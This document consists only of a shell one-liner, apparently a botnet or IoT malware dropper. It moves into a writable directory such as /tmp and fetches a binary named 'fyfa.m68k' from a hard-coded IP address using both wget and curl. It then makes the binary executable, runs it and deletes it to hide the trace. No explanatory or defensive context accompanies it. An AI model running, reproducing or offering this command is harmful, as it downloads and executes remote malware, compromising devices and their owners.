cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.236.54.99/fyfa.m68k; curl -O http://104.236.54.99/fyfa.m68k; chmod +x fyfa.m68k; ./fyfa.m68k; rm -rf fyfa.m68k
